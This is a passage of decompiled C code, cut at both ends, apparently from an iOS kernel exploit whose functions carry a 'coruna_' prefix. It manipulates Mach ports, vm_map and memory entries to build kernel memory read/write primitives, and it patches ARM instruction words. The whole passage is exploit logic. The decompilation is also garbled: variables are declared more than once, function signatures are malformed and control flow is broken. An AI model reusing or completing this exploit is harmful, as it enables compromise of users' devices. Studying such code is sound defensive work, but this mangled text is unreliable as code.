    _free(ptr);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_21) {
    return size;
  }
  ___stack_chk_fail();
}





uint64_t coruna_call_dlopen_iosurface(uint32_t *size)
{
  uint32_t u;
  
  u = coruna_dlopen_iosurface(*(uint64_t *)(size + 4),*(uint64_t *)(size + 2));
  *size = u;
  return 0;
}
uint8_t * coruna_dlopen_iosurface(void)
{
  unsigned long *ptr;
  unsigned long *buf;
  vm_address_t *address;
  vm_prot_t permission;
  byte err;
  uint8_t *str;
  uint8_t *copy;
  mach_port_t lm6;
  mach_msg_size_t lm7;
  mach_msg_id_t lm8;
  mach_msg_size_t lm9;
  mach_msg_id_t lm10;
  bool status;
  uint u;
  mach_port_name_t lm13;
  int err;
  pid_t lp15;
  mach_msg_return_t lm16;
  kern_return_t lk17;
  uint size;
  mach_port_t lm19;
  uint version;
  uint port;
  uint tag;
  int status;
  unsigned long kind;
  void *ptr;
  uint *data;
  qword *lpq27;
  uint64_t type_id;
  uint8_t *obj;
  long handle;
  long addr;
  unsigned long type_id_8;
  long off;
  long *buf;
  long base;
  uint64_t type_id_9;
  uint64_t type_id_10;
  int *err;
  uint *block;
  char *ptr;
  uint32_t *entry;
  uint *entry_9;
  unsigned long type_id_11;
  bool flags;
  vm_address_t lv45;
  unsigned long type_id_12;
  uint32_t *entry_10;
  long ctx_val;
  vm_size_t lv49;
  long *str;
  unsigned long type_id_13;
  uint32_t type_id_14;
  uint8_t *entry_11;
  qword *lpq54;
  long serial;
  uint64_t *entry_12;
  int *status;
  long serial_7;
  long *copy;
  uint64_t type_id_15;
  unsigned long type_id_16;
  uint8_t *entry_13;
  uint16_t type_id_17;
  uint8_t port[16];
  vm_inherit_t in_stack_ffffffffffffeeb0;
  unsigned long scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  uint64_t host_info;
  unsigned long serial_buf;
  uint action;
  unsigned long block_ctx;
  long stack_guard;
  unsigned long *sa_saved;
  long sa_new;
  int *path_buf;
  int *tmp_buf;
  vm_size_t region;
  mem_entry_name_port_t plist [3];
  vm_address_t url_buf;
  qword *json_buf [4];
  unsigned long frame;
  vm_address_t work;
  unsigned long cache;
  uint32_t cache_20;
  unsigned long cache_21;
  unsigned long cache_22;
  qword *cache_23;
  long cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  mach_msg_header_t cache_27;
  uint host_info;
  uint32_t serial_buf;
  uint32_t action;
  uint32_t block_ctx;
  unsigned long stack_guard;
  unsigned long cache_28;
  uint64_t sa_saved;
  uint64_t cache_29;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_30;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t cache_31;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache_32;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_33;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t cache_34;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t cache_27;
  long cache_35;
  
  port = (*(void (*)k_kernel_chkstk_darwin_slot)();
  copy = k_kernel_vm_page_size_slot;
  err = port;
  data = port;
  cache_35 = *(long *)k_kernel_stack_chk_guard_slot;
  entry_13 = (uint8_t *)0xad011;
  url_buf = 0;
  plist[0] = 0;
  region = *(vm_size_t *)k_kernel_vm_page_size_slot;
  kind = coruna_kernel79e8_via_cpu_capabilities_base();
  *(unsigned long *)(err + 2) = kind;
  *(uint64_t *)(err + 0xd3a) = k_kernel_rodata_word_3b1c0;
  str = k_kernel_mach_task_self_slot;
  if (0x400000000 < kind) {
    entry_11 = (uint8_t *)0xad008;
    if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
    ___stack_chk_fail();
    }
    return entry_11;
  }
  u = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&url_buf,0x2000,1);
  if (u == 0) {
    *(vm_address_t *)(err + 0xd26) = url_buf;
    err[0xd28] = 0x2000;
    err[0xd29] = 0;
    cache_27 = (qword *)0x0;
    ctx_val = *(long *)copy;
    u = _vm_map(*(vm_map_t *)str,(vm_address_t *)&cache_27,ctx_val * 0x81,0x1ffffff,
                     -0x36ffffff,0,0,0,3,1,in_stack_ffffffffffffeeb0);
    if (u == 0) {
      block = (uint *)(err + 0x1191);
      *(uint64_t *)(err + 0xd22) = cache_27;
      *(long *)(err + 0xd24) = *(long *)copy + ctx_val * 0x80;
      ctx_val = 0xd2a;
      do {
        lm13 = _mach_reply_port();
        if (lm13 + 1 < 2) {
          entry_11 = &k_kernel_slot_1001;
          if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
          ___stack_chk_fail();
          }
          return entry_11;
        }
        err[ctx_val] = lm13;
        plist[1] = 0x400;
        u = _mach_port_set_attributes
                           (*(ipc_space_t *)str,lm13,1,(mach_port_info_t)(plist + 1),1);
        entry_11 = (uint8_t *)(unsigned long)(u | 0x80000000);
        if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
        ___stack_chk_fail();
        }
        return entry_11;
      } while (ctx_val != 0xd3a);
      u = _mach_make_memory_entry(*(vm_map_t *)str,&region,0,0x20003,plist,0);
      if (u == 0) {
        err[0xd1c] = plist[0];
        ptr = _calloc(0x200000,4);
        if (ptr == (void *)0x0) {
          entry_11 = (uint8_t *)0xad009;
          if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
          ___stack_chk_fail();
          }
          return entry_11;
        }
        *(void **)(err + 0xd1e) = ptr;
        err[0xd20] = 0x200000;
        cache_27 = (qword *)0x0;
        lv49 = *(long *)copy << 9;
        u = _vm_allocate(*(vm_map_t *)str,(vm_address_t *)&cache_27,lv49,-0x33ffffff);
        entry_11 = (uint8_t *)(unsigned long)(u | 0x80000000);
        if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
        ___stack_chk_fail();
        }
        return entry_11;
      }
    }
  }
  entry_11 = (uint8_t *)(unsigned long)(u | 0x80000000);
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
  ___stack_chk_fail();
  }
  return entry_11;
}





void coruna_vm_region_64(long handle,long addr_2,long off_3,uint size)
{
  unsigned long u;
  uint size;
  long handle;
  unsigned long version;
  long addr;
  long off;
  vm_address_t lv7;
  size_t ls8;
  long base;
  long *ptr;
  unsigned long port;
  unsigned long tag;
  long scratch;
  mach_port_t bootargs;
  mach_msg_type_number_t thread_attr;
  int host_info [8];
  uint16_t serial_buf;
  vm_size_t action;
  vm_address_t block_ctx;
  vm_address_t stack_guard;
  long sa_saved;
  long sa_new;
  
  sa_new = *(long *)k_kernel_stack_chk_guard_slot;
  size = 0xad022;
  base = *(long *)(handle + 0x50);
  if (base == 0) {
    size = 0xad001;
  }
  else {
    ptr = *(long **)(&k_kernel_slot_3448 + base);
    off = *(long *)(&k_kernel_slot_3458 + base);
    if (((*(long *)(off + 0x18) == ptr[2]) &&
        (scratch = *(long *)(&k_kernel_slot_3450 + base), *(long *)(off + 8) == scratch)) &&
       (*ptr == *(long *)(&k_kernel_slot_3460 + base))) {
      if (size != 0) {
        port = 0;
        handle = *(long *)k_kernel_vm_page_size_slot;
        lv7 = ptr[3] - handle;
        tag = (unsigned long)size;
        do {
          u = port + addr_2;
          version = *(unsigned long *)(handle + 0x188) & u;
          size = *(uint *)(handle + 0x180);
          thread_attr = 9;
          *(long *)(off + 8) = ptr[1];
          block_ctx = lv7;
          _madvise(*(uint64_t *)(&k_kernel_slot_2c20 + base),handle << 1,2);
          addr = ptr[1];
          handle = ptr[3];
          ls8 = tag;
          if ((unsigned long)size < version + 0x40 && version + tag <= (unsigned long)size) {
            ptr[1] = u - 0x4e;
            ptr[3] = lv7;
            size = _vm_region_64(*(vm_map_t *)k_kernel_mach_task_self_slot,&block_ctx,&action,9,
                                  host_info,&thread_attr,&bootargs);
            ptr[1] = addr;
            ptr[3] = handle;
            *(long *)(off + 8) = scratch;
            *(long *)(&k_kernel_slot_3468 + base) = *(long *)(&k_kernel_slot_3468 + base) + 1;
            {
              size = size | 0x80000000;
              if (*(long *)k_kernel_stack_chk_guard_slot == sa_new) {
              return;
              }
              ___stack_chk_fail(size);
            }
            if (1 < tag) {
              ls8 = 2;
            }
            stack_guard = coruna_cat(stack_guard,serial_buf);
          }
          else {
            ptr[1] = u - 0x10;
            ptr[3] = lv7;
            size = _vm_region_64(*(vm_map_t *)k_kernel_mach_task_self_slot,&block_ctx,&action,9,
                                  host_info,&thread_attr,&bootargs);
            ptr[1] = addr;
            ptr[3] = handle;
            *(long *)(off + 8) = scratch;
            *(long *)(&k_kernel_slot_3468 + base) = *(long *)(&k_kernel_slot_3468 + base) + 1;
            if (size != 0) {
fail:
              size = size | 0x80000000;
              if (*(long *)k_kernel_stack_chk_guard_slot == sa_new) {
              return;
              }
              ___stack_chk_fail(size);
            }
            if (0xf < tag) {
              ls8 = 0x10;
            }
            sa_saved = action + block_ctx;
            stack_guard = block_ctx;
          }
          _memcpy((void *)(off_3 + port),&stack_guard,ls8);
          port = ls8 + port;
          if (size <= port) break;
          tag = tag - ls8;
          scratch = *(long *)(off + 8);
          handle = *(long *)k_kernel_vm_page_size_slot;
        } while( true );
      }
      size = 0;
    }
  }
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_new) {
    return;
  }
  ___stack_chk_fail(size);
}





uint coruna_mach_make_memory_entry_fae4(long handle,long *addr_2)
{
  unsigned long u;
  uint size;
  uint version;
  uint port;
  unsigned long tag;
  long handle;
  unsigned long kind;
  unsigned long type_id;
  unsigned long type_id_8;
  long addr;
  vm_size_t lv11;
  long off;
  uint16_t type_id_9;
  uint64_t type_id_10;
  mem_entry_name_port_t scratch;
  vm_size_t bootargs;
  vm_address_t thread_attr;
  long host_info;
  
  lv11 = *(vm_size_t *)k_kernel_vm_page_size_slot;
  size = *(uint *)k_kernel_vm_page_shift_slot;
  host_info = 0;
  _arc4random_buf(&host_info,8);
  tag = *(unsigned long *)(handle + 8);
  u = 0x80000;
  if (tag >> 0x20 == 0) {
    u = 0x40000;
  }
  type_id = 0x100000;
  if (tag >> 0x21 == 0) {
    type_id = u;
  }
  u = 0x200000;
  if (tag >> 0x22 == 0) {
    u = type_id;
  }
  port = 0xad001;
  thread_attr = *(vm_address_t *)(&k_kernel_slot_3488 + handle);
  if ((thread_attr != 0) && (off = *(long *)(&k_kernel_slot_3490 + handle), off != 0)) {
    _madvise((thread_attr - lv11) + off,lv11,3);
    version = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,off - lv11,
                         -0x35ffc000);
    if (version == 0) {
      tag = 0;
      port = 0xad011;
      do {
        if (((tag != 0) && ((tag & 0x7f) == 0)) &&
           (version = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,
                                 off - lv11,-0x35ffc000), version != 0)) goto fail;
        handle = lv11 * ((uint)tag & 0x7f);
        *(unsigned long *)(thread_attr + handle) = host_info + tag;
        DataSynchronizationBarrier(2,3,0);
        version = *(uint *)(addr_2 + 4);
        if (version != 0) {
          type_id = 0;
          kind = addr_2[3];
          do {
            type_id_8 = 1L << (type_id & 0x3f);
            if ((kind & type_id_8) == 0) {
              addr = *(long *)(*addr_2 + (unsigned long)(uint)((int)type_id << (unsigned long)(size & 0x1f)));
              if (addr == host_info + tag) {
                scratch = 0;
                addr_2[3] = kind | type_id_8;
                bootargs = lv11;
                port = _mach_make_memory_entry
                                  (*(vm_map_t *)k_kernel_mach_task_self_slot,&bootargs,
                                   thread_attr + handle,0x200003,&scratch,0);
                if (port == 0) {
                  port = 0;
                  *(mem_entry_name_port_t *)(addr_2 + 5) = scratch;
                }
                else {
                  port = port | 0x80000000;
                }
                version = *(uint *)(addr_2 + 4);
                break;
              }
              if (addr != *(long *)(&k_kernel_slot_3518 + handle)) {
                kind = kind | type_id_8;
                addr_2[3] = kind;
              }
            }
            type_id = type_id + 1;
          } while (version != type_id);
        }
        handle = addr_2[3];
        type_id_10 = coruna_cat(POPCOUNT((char)((unsigned long)handle >> 0x38)),
                          coruna_cat(POPCOUNT((char)((unsigned long)handle >> 0x30)),
                                   coruna_cat(POPCOUNT((char)((unsigned long)handle >> 0x28)),
                                            coruna_u64_pack14((POPCOUNT((char)((unsigned long)handle >> 0x20))), (coruna_u64_pack13((POPCOUNT((char))((unsigned long)handle >> 0x18))
                                                              ), (coruna_cat(POPCOUNT((char))((unsigned long)handle
                                                                                       >> 0x10)),
                                                                        coruna_cat(POPCOUNT((char)((
                                                  unsigned long)handle >> 8)),POPCOUNT((char)handle))))))));
        type_id_9 = NEON_uaddlv(type_id_10,1);
        tag = tag + 1;
      } while ((version != (uint)coruna_cat((int6)((unsigned long)type_id_10 >> 0x10),type_id_9) && port != 0) &&
               tag != u);
    }
    else {
fail:
      port = version | 0x80000000;
    }
  }
  return port;
}





uint coruna_vm_protect_fd18(int *flags,long *handle)
{
  vm_address_t address;
  uint u;
  uint8_t *ptr;
  uint size;
  unsigned long version;
  vm_size_t size;
  unsigned long port;
  unsigned long tag;
  uint16_t kind;
  uint64_t type_id;
  
  ptr = k_kernel_mach_task_self_slot;
  size = *(uint *)(handle + 4);
  version = handle[3];
  type_id = coruna_cat(POPCOUNT((char)(version >> 0x38)),
                   coruna_cat(POPCOUNT((char)(version >> 0x30)),
                            coruna_cat(POPCOUNT((char)(version >> 0x28)),
                                     coruna_u64_pack14((POPCOUNT((char)(version >> 0x20))), (coruna_u64_pack13((POPCOUNT((char))(version >> 0x18))), (coruna_cat(POPCOUNT((char))(version >> 0x10)),
                                                                coruna_cat(POPCOUNT((char)(version >> 8)
                                                                                 ),
                                                                         POPCOUNT((char)version)))))))
                  );
  kind = NEON_uaddlv(type_id,1);
  if (size != (uint)coruna_cat((int6)((unsigned long)type_id >> 0x10),kind)) {
    size = *(vm_size_t *)k_kernel_vm_page_size_slot;
    u = *(uint *)k_kernel_vm_page_shift_slot;
    if (((*flags != 3) || (1 < *(int *)((long)handle + 0x24) + 1U)) && (size != 0)) {
      port = 0;
      do {
        tag = 1L << (port & 0x3f);
        if ((version & tag) == 0) {
          address = *handle + (unsigned long)(uint)((int)port << (unsigned long)(u & 0x1f));
          size = _vm_protect(*(vm_map_t *)ptr,address,size,0,0);
          if ((size != 0) ||
             (size = _vm_protect(*(vm_map_t *)ptr,address,size,0,3), size != 0)) {
            return size | 0x80000000;
          }
          version = handle[3] | tag;
          handle[3] = version;
          size = *(uint *)(handle + 4);
        }
        port = port + 1;
      } while (port < size);
    }
  }
  return 0;
}





uint coruna_vm_deallocate_fe30(long handle)
{
  uint u;
  uint8_t *ptr;
  uint size;
  int err;
  uint *buf;
  vm_size_t size;
  vm_inherit_t in_stack_ffffffffffffffc0;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  if (*(mem_entry_name_port_t *)(&k_kernel_slot_34f0 + handle) + 1 < 2) {
    size = 0xad001;
  }
  else {
    scratch = 0;
    size = *(vm_size_t *)k_kernel_vm_page_size_slot;
    size = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,size,0,1,
                    *(mem_entry_name_port_t *)(&k_kernel_slot_34f0 + handle),0,0,3,2,
                    in_stack_ffffffffffffffc0);
    if (size == 0) {
      err = _madvise(scratch,size,3);
      if (err == 0) {
        size = 0;
      }
      else {
        buf = (uint *)___error();
        u = *buf;
        size = -u;
        if (-1 < (int)u) {
          size = u;
        }
        size = size | 0x40000000;
      }
      _vm_deallocate(*(vm_map_t *)ptr,scratch,size);
    }
    else {
      size = size | 0x80000000;
    }
  }
  return size;
}





uint64_t
void coruna_kernel6544_residual_243(long handle,long addr_2,long off_3,int flags,uint64_t *val,
            uint64_t id_2,unsigned long arg)
{
  unsigned long u;
  long handle;
  uint64_t size;
  uint version;
  uint scratch;
  
  handle = coruna_kernel6544_via_ctx_test_flag_11(handle,0,&scratch);
  if (handle == 0) {
    size = 0xad001;
  }
  else {
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[6] = 0;
    val[1] = 0;
    *val = 0;
    u = 0;
    if (*(unsigned long *)k_kernel_vm_page_size_slot != 0) {
      u = arg / *(unsigned long *)k_kernel_vm_page_size_slot;
    }
    val[3] = 0;
    val[6] = u;
    *(uint32_t *)((long)val + 0x2c) = 0x140;
    *(int *)(val + 4) = (int)((unsigned long)(off_3 - handle) >> ((unsigned long)scratch & 0x3f));
    *(uint32_t *)((long)val + 0x24) = 0x2000000;
    *(uint64_t *)(addr_2 + 0x20) = id_2;
    if (flags == 0) {
      size = 0;
    }
    else {
      version = 0x4800;
      if (*(unsigned long *)(handle + 0x158) < 0x27120007400000) {
        version = 0x90000;
      }
      if ((version & (*(uint *)(addr_2 + 0x74) ^ 0xffffffff)) == 0) {
        size = 0;
        version = 0x80;
        if (*(unsigned long *)(handle + 0x158) < 0x27120007400000) {
          version = 0x1000;
        }
        *(uint *)(addr_2 + 0x74) = version | *(uint *)(addr_2 + 0x74);
      }
      else {
        size = 0x28011;
      }
    }
  }
  return size;
}





void coruna_cfdictionarysetvalue(uint64_t val,uint64_t id_2)
{
  uint64_t u;
  uint32_t scratch;
  
  scratch = 0x20;
  u = _CFNumberCreate(0,9,&scratch);
  _CFDictionarySetValue(val,id_2,u);
  _CFRelease(u);
  return;
}





uint coruna_vm_deallocate_10214(long handle,long addr_2,unsigned long arg)
{
  short *lps1;
  long handle;
  int err;
  uint u;
  unsigned long size;
  vm_address_t lv6;
  vm_size_t size;
  vm_inherit_t in_stack_ffffffffffffff80;
  uint32_t scratch;
  unsigned long scratch;
  vm_address_t bootargs [7];
  vm_address_t thread_attr;
  
  u = 0x2800f;
  err = coruna_nop_stub_6(handle,(arg - *(long *)(&k_kernel_slot_3500 + addr_2) >>
                                ((unsigned long)*(uint *)k_kernel_vm_page_shift_slot & 0x3f) & 0xffffffff) *
                               8 + *(long *)(&k_kernel_slot_3508 + addr_2),8,&scratch);
  if (err != 0) {
    if ((~(uint)scratch & 3) == 0) {
      err = coruna_ctx_test_flag(handle,0x8000);
      handle = 8;
      if (err != 0) {
        handle = 0x20;
      }
      err = coruna_kernel6544_residual_256(handle,(scratch & 0xfffffffffffc) + handle + -0xffffffffffe8,
                           &ghidra_stack_0);
      if (err != 0) {
        size = coruna_return_zero_30adc(handle,coruna_u64_pack((scratch), (in_stack_ffffffffffffff80)) +
                                     (arg >> 10 & 0xc));
        if (size == 0) {
          u = 0x28026;
        }
        else {
          thread_attr = 0;
          size = *(vm_size_t *)k_kernel_vm_page_size_slot;
          if (*(mem_entry_name_port_t *)(handle + 0x58) + 1 < 2) {
            err = coruna_vm_protect(handle,size,bootargs);
            if (err != 0) {
              return 0xffffffff;
            }
          }
          else {
            u = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,size,0,1,
                            *(mem_entry_name_port_t *)(handle + 0x58),
                            size & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),0,3,2,
                            in_stack_ffffffffffffff80);
            if (u != 0) {
              return u | 0x80000000;
            }
          }
          err = *(int *)(handle + 0x58);
          lv6 = thread_attr;
          if (err + 1U < 2) {
            lv6 = bootargs[0];
          }
          lps1 = (short *)((*(unsigned long *)(handle + 0x188) & size) + lv6);
          if (*lps1 == 0) {
            u = 0x28011;
          }
          else {
            u = 0;
            LOAcquire();
            *lps1 = *lps1 + -1;
            LORelease();
            lps1[1] = 0x4000;
            err = *(int *)(handle + 0x58);
          }
          if (err + 1U < 2) {
            coruna_mach_port_deallocate_2d808(handle,bootargs);
          }
          else {
            _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,thread_attr,size);
          }
        }
      }
    }
    else {
      u = 0xad014;
    }
  }
  return u;
}





uint64_t coruna_kernel6544_via_ptr_canonicalize(long handle,long addr_2,uint64_t *val)
{
  int err;
  uint64_t u;
  long handle;
  uint64_t scratch;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err != 0x1c1b) {
        return 0x2802c;
      }
      handle = 0xf8;
      err = coruna_kernel6544_residual_256(handle,handle + addr_2,&scratch);
      if (err == 0) {
      u = 0x2800f;
      }
      else {
      if ((*(unsigned long *)(handle + 0x158) < 0x1f530000000000) &&
      (err = coruna_kernel6544_residual_256(handle,scratch,&scratch), err == 0)) {
      return 0x2800f;
      }
      handle = coruna_ptr_canonicalize(handle,scratch);
      if (handle == 0) {
      u = 0x28026;
      }
      else {
      u = 0;
      *val = scratch;
      }
      }
      return u;
    }
  }
  else if (err != 0x225c && err != 0x2258) {
    return 0x2802c;
  }
  handle = 0xf8;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    handle = 0x100;
  }
fail:
  err = coruna_kernel6544_residual_256(handle,handle + addr_2,&scratch);
  if (err == 0) {
    u = 0x2800f;
  }
  else {
    if ((*(unsigned long *)(handle + 0x158) < 0x1f530000000000) &&
       (err = coruna_kernel6544_residual_256(handle,scratch,&scratch), err == 0)) {
      return 0x2800f;
    }
    handle = coruna_ptr_canonicalize(handle,scratch);
    if (handle == 0) {
      u = 0x28026;
    }
    else {
      u = 0;
      *val = scratch;
    }
  }
  return u;
}





unsigned long coruna_kernel6544_via_ptr_canonicalize_2(uint64_t arg,uint64_t val,unsigned long n,uint64_t *m)

{
  uint type_id_13;
  int flags;
  unsigned long u;
  long base;
  long work;
  long cache;
  long cache_20;
  
  *m = 0;
  work = 0;
  u = coruna_kernel6544_via_ptr_canonicalize(arg,val,&cache_20);
  if ((int)u == 0) {
    type_id_13 = 0x2800f;
    u = 0x2800f;
    flags = coruna_kernel6544_residual_256(arg,cache_20 + (n & 0xffffffff) * 8,&cache);
    if (flags != 0) {
      base = coruna_ptr_canonicalize(arg,cache);
      if (base == 0) {
        u = 0x28026;
      }
      else {
        flags = coruna_kernel6544_residual_256(arg,cache + 0x10,&work);
        if (flags != 0) {
          coruna_ptr_canonicalize(arg,work);
          flags = coruna_kernel6544_residual_256(arg,work + 0x38,m);
          if (flags != 0) {
            type_id_13 = 0;
          }
          u = (unsigned long)type_id_13;
        }
      }
    }
  }
  return u;
}





uint32_t coruna_kernel6544_via_nop_stub_7(long handle)
{
  int err;
  uint32_t u;
  
  err = coruna_nop_stub_7(*(uint64_t *)(handle + 0x20));
  u = 5;
  if (err != 0) {
    u = 0;
  }
  return u;
}





uint32_t coruna_kernel6544_via_nop_stub_6(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  int err;
  uint32_t u;
  
  err = coruna_nop_stub_6(*(uint64_t *)(handle + 0x20),val,size_3,id_2);
  u = 5;
  if (err != 0) {
    u = 0;
  }
  return u;
}





uint64_t coruna_kernel6544_via_nop_stub_6_2(long handle,uint64_t val)
{
  uint64_t u;
  int err;
  uint64_t scratch;
  
  err = coruna_nop_stub_6(*(uint64_t *)(handle + 0x20),val,8,&scratch);
  u = 0;
  if (err != 0) {
    u = scratch;
  }
  return u;
}





uint32_t coruna_kernel6544_via_nop_stub_7_2(long handle,uint64_t val,uint64_t id_2)
{
  int err;
  uint32_t u;
  uint64_t scratch;
  
  scratch = id_2;
  err = coruna_nop_stub_7(*(uint64_t *)(handle + 0x20),val,&scratch,8);
  u = 5;
  if (err != 0) {
    u = 0;
  }
  return u;
}





uint32_t coruna_kernel6544_residual_244(long handle,uint64_t val)
{
  uint32_t u;
  int err;
  uint32_t scratch;
  
  err = coruna_kernel6544_via_fcntl_1bf84(*(uint64_t *)(handle + 0x20),val,&scratch);
  u = 0;
  if (err != 0) {
    u = scratch;
  }
  return u;
}





uint32_t coruna_call_mach_vm_machine_attribute(long handle)
{
  int err;
  uint32_t u;
  
  err = coruna_mach_vm_machine_attribute(*(uint64_t *)(handle + 0x20));
  u = 5;
  if (err != 0) {
    u = 0;
  }
  return u;
}
uint64_t coruna_return_zero_ada8(long *handle,uint64_t val)
{
  long handle;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  handle[1] = 0xb0;
  thread_attr = k_kernel_rodata_word_0003b2d8;
  thread_attr = k_kernel_rodata_word_3b2d0;
  host_info = coruna_u64_pack((host_info), (k_kernel_rodata_word_3b2e0));
  scratch = k_kernel_rodata_word_0003b2ec;
  scratch = k_kernel_rodata_word_3b2e4;
  bootargs = coruna_u64_pack((bootargs), (k_kernel_rodata_word_3b2f4));
  handle = coruna_return_zero_3820c_stub(val,&thread_attr,&scratch,5);
  *handle = handle + 4;
  thread_attr = k_kernel_rodata_word_0003b300;
  thread_attr = k_kernel_rodata_word_3b2f8;
  host_info = k_kernel_rodata_word_0003b310;
  host_info = k_kernel_rodata_word_3b308;
  scratch = 0xffffffffffffffff;
  scratch = 0xffffffffffffffff;
  bootargs = 0xffffffffffffffff;
  bootargs = 0xffffffffffffffff;
  handle = coruna_return_zero_3820c_stub(val,&thread_attr,&scratch,8);
  handle[2] = handle;
  handle[3] = handle + 0x14;
  handle[8] = handle + 0x1c;
  thread_attr = k_kernel_rodata_word_3b278;
  thread_attr = 0xd65f03c0;
  scratch = 0xffffffffffffffff;
  scratch = 0xffffffff;
  handle = coruna_return_zero_3820c_stub(val,&thread_attr,&scratch,3);
  handle[4] = handle;
  thread_attr = k_kernel_rodata_word_3b280;
  thread_attr = 0xd65f03c0;
  scratch = 0xffffffffffffffff;
  scratch = 0xffffffff;
  handle = coruna_return_zero_3820c_stub(val,&thread_attr,&scratch,3);
  handle[5] = handle;
  thread_attr = k_kernel_rodata_word_3b288;
  thread_attr = coruna_u64_pack((thread_attr), (0x910002bf));
  scratch = 0xffffffffffffffff;
  scratch = coruna_u64_pack((scratch), (0xffffffff));
  handle = coruna_return_zero_3820c_stub(val,&thread_attr,&scratch,3);
  handle[6] = handle;
  thread_attr = k_kernel_rodata_word_0003b320;
  thread_attr = k_kernel_rodata_word_3b318;
  host_info = coruna_u64_pack((host_info), (k_kernel_rodata_word_3b328));
  scratch = k_kernel_rodata_word_0003b334;
  scratch = k_kernel_rodata_word_3b32c;
  bootargs = coruna_u64_pack((bootargs), (k_kernel_rodata_word_3b33c));
  handle = coruna_return_zero_3820c_stub(val,&thread_attr,&scratch,5);
  handle[7] = handle;
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return 0;
  }
  ___stack_chk_fail();
}





long coruna_mach_port_allocate_1091c(long handle,int flags)
{
  uint8_t *ptr;
  mach_msg_header_t *lpm2;
  long handle;
  long addr;
  uint64_t u;
  uint64_t size;
  mach_port_name_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
  lpm2 = _calloc(1,(unsigned long)(flags + 0x18U));
  lpm2->msgh_size = flags + 0x18U;
  lpm2->msgh_remote_port = scratch;
  lpm2->msgh_bits = 0x15;
  _mach_msg_send(lpm2);
  handle = coruna_nop_stub_4(*(uint64_t *)(handle + 8),scratch);
  addr = coruna_kernel6544_via_nop_stub_6_2(*(uint64_t *)(handle + 8),handle + 0x20);
  size = *(uint64_t *)(*(long *)(handle + 8) + 0x20);
  u = coruna_kernel6544_via_nop_stub_6_2(*(long *)(handle + 8),addr + 0x10);
  addr = coruna_kernel6544_via_ctx_test_flag_6(size,u);
  coruna_kernel6544_via_nop_stub_7_2(*(uint64_t *)(handle + 8),handle + 0x20,0,1);
  _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
  return addr + 0x20;
}





mach_msg_return_t
void coruna_mach_msg_send(long handle,uint64_t val,uint64_t id_2,unsigned long arg,uint64_t size_3,
            uint64_t off_4,uint64_t off_5)
{
  long handle;
  void (*ptr)(void);
  mach_msg_return_t lm3;
  long addr;
  unsigned long unaff_x30;
  
  addr = *(long *)(handle + 0x10);
  *(uint32_t *)(addr + 0x408) = *(uint32_t *)(addr + 8);
  *(uint32_t *)(addr + 0x40c) = 0;
  *(int *)(addr + 0x414) = *(int *)(addr + 0x14) + 100;
  _memcpy((void *)(addr + 0x42c),(void *)(addr + 0x38),0x210);
  *(uint64_t *)(addr + 0x418) = *(uint64_t *)k_kernel_ndr_record_slot;
  *(uint32_t *)(addr + 0x428) = 0x84;
  *(uint64_t *)(addr + 0x420) = k_kernel_rodata_word_3b290;
  *(uint64_t *)(addr + 0x400) = k_kernel_rodata_word_3b298;
  _memcpy(*(void **)(handle + 0x18),(void *)(handle + 0x2c),0x130);
  addr = *(long *)(handle + 0x10);
  handle = *(long *)(handle + 0x18);
  *(uint64_t *)(handle + 8) = val;
  *(uint64_t *)(handle + 0x10) = id_2;
  *(unsigned long *)(handle + 0x18) = arg & 0xffffffff;
  *(uint64_t *)(handle + 0x20) = size_3;
  *(uint64_t *)(handle + 0x28) = off_4;
  *(uint64_t *)(handle + 0x30) = off_5;
  _mach_msg_send((mach_msg_header_t *)(addr + 0x400));
  _bzero(*(void **)(handle + 0x10),0x800);
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  lm3 = _mach_msg(*(mach_msg_header_t **)(handle + 0x10),2,0,0x400,
                    *(mach_port_name_t *)(handle + 0x170),0,0);
  return lm3;
}





void coruna_kernel09_via_mach_msg_send(long handle,uint64_t val,uint64_t id_2,uint64_t size_3,
                 uint64_t off_4,long addr_2)
{
  uint64_t u;
  uint64_t size;
  long handle;
  long addr;
  
  handle = 0;
  addr = *(long *)(handle + 0x160);
  do {
